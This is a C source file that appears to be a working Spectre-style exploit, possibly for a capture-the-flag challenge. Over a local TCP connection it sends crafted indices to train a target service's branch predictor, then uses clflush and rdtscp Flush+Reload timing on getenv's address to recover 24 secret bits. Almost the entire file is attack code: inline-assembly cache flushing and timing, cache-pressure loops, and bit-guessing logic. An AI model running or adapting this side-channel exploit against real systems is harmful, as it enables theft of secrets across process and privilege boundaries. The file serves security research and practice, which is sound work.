#define _GNU_SOURCE  

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>


static void inline check(char* msg) {
  if (errno != 0) {
    perror(msg);
    exit(errno);
  }
}

__attribute__((naked)) void clflush(volatile void *p) {
    asm volatile (  "mfence;"
                    "clflush [rdi];"
                    "mfence;"
                    "ret" :::);
}

__attribute__((naked)) void block() {
    asm volatile (  "mfence;"
                    "lfence;"
                    "sfence;"
                    "ret" :::);
}

__attribute__((naked)) uint64_t time_foo(volatile void *p){
    asm volatile( 
        "push rbx;"
        "mfence;"
        "xor rax, rax;"
        "mfence;"       
        "rdtscp;"         // before
        "mov rbx, rax;"
        "mov rdi, [rdi];" // RELOAD
        "rdtscp;"         // after
        "mfence;"    
        "sub rax, rbx;"   // return after - before
        "pop rbx;"
        "ret;" :::
    );
}

/*
#define ITER 10000

void doTest() {
    uint8_t* addr = (uint8_t*) &getenv;    
  printf("guessing %p\n", addr);


  uint64_t cnt1 = 0;
  uint64_t cnt2 = 0;
  for (size_t i = 0; i < ITER; i++) {
    clflush(addr);

    getenv("TEST");

    cnt1 += time_foo(addr);
  }
  
  for (size_t i = 0; i < ITER; i++) {
    clflush(addr);

    cnt2 += time_foo(addr);
  }

  printf("%lu %lu\n", cnt1, cnt2);
}
*/

size_t TARGET = 0x18;

int *mem;
int *mem2;

void vuln(size_t idx) {
  uint64_t guess = 0x0141654f;

  if (idx < TARGET && ((guess >> idx) & 1 ) != 0) {
    getenv("TEST");
  }
}

int psleep(size_t iter){
    for (size_t i = 0; i < iter; i++); 
    return 0;
}

int main() {
    cpu_set_t set;
    memset(&set, 0, sizeof(cpu_set_t));
    set.__bits[0] = 1;
    sched_setaffinity(0, sizeof(cpu_set_t), &set);
    
  //(void) !system("ls");

  mem = mmap(NULL, 50000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, 0, 0);
  mem2 = mmap(NULL, 50000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, 0, 0);
  for (int i = 0; i < 50000000/sizeof(int); i++) {
    mem[i] = 1;
    mem2[i] = 1;
  }

  int fd = socket(AF_INET, SOCK_STREAM, 0); 
  check("socket");
  
  struct sockaddr_in remote= {0};
  remote.sin_addr.s_addr = inet_addr("0.0.0.0");
  remote.sin_family = AF_INET;
  remote.sin_port = htons(8080);
  
  connect(fd, (struct sockaddr *)&remote, sizeof(struct sockaddr_in));
  check("connect");

  int idx = 0;
  printf("size: %ld\n", sizeof(idx));
    
  uint8_t* addr = (uint8_t*) &getenv;    
  printf("guessing %p\n", addr);
 
  const size_t ITER = 200;
  
  uint64_t fast = 0;
  uint64_t slow = 0;
  for (size_t i = 0; i < ITER; i++) {
    clflush(addr);

    getenv("TEST");

    fast += time_foo(addr);
  }
  
  for (size_t i = 0; i < ITER; i++) {
    clflush(addr);

    slow += time_foo(addr);
  }

  int ufd = open("/dev/urandom", O_RDONLY);

  char random[0x1000];
  size_t ret = read(ufd, random, sizeof(random));
  printf("read: %ld %lx\n", ret, *(uint64_t*) &random);

  printf("fast: %lu\n", fast);
  printf("slow: %lu\n", slow);
 
  for (size_t bit = 0; bit < 0x18; bit++) {
    read(ufd, random, sizeof(random));
    if (bit % 8 == 0) printf("%zx:\n", bit);
    uint64_t cnt = 0;
    for (size_t iter = 0; iter < ITER; iter++) {
      clflush(addr);

      //int good = 0;
      size_t tot = random[iter];
      tot %= 0x100;
      tot += 0x100;

      int x = 0;
      int mx = 8 * 25 + 144 + bit;
      for (size_t i = 0; i < tot; i++) {
        x = ((tot - 1 - i) - 1) & ~0xFFFF;
        x = (x | (x >> 16)); 
        int training_x = random[i % sizeof(random)];
        training_x %= 8 * 18;
        
        int k = 0 ^ (x & 625);
        k *= 1000;

        x = training_x ^ (x & (mx ^ training_x));
        //write(fd, &good, sizeof(good));
        register int *a asm ("rdi") = mem;
        register int *b asm ("rsi") = mem2;
        register int c asm ("rcx") = k;
        asm volatile (
            "rep movsq;"
        );
        //evict();
        clflush(addr);
        
        write(fd, &x, sizeof(x));
      }

      // printf("\x00%d\n", mem);
      // register int *a asm ("rdi") = mem;
      // register int *b asm ("rsi") = mem2;
      // asm volatile (
      //     "rep movsq;"
      // );
      // clflush(&TARGET);
      // clflush(addr);

      // vuln(0x18);

      psleep(10000);

      int n = time_foo(addr);
      //printf("%d\n", n);
      cnt += (n < 150);
    }
    printf("guess: %lu\n", cnt);
  }

  return 0;
}

